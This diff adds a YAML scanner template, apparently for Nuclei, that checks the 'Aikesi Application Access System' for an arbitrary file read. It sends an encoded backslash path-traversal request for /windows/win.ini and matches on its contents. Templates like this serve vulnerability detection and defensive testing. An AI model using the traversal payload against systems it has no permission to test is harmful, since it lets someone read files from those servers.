@@ -1,0 +1,24 @@
+id: poc-yaml-aikesi-system-arbitrary-file-read
+
+info:
+  name: Aikesi Application Access System Arbitrary File Read
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read
+  description: |
+    Vulnerability in Aikesi Application Access System that allows arbitrary file read.
+
+http:
+  - method: GET
+    path:
+      - "/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/windows/win.ini"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "[fonts]"
+          - "[extensions]"
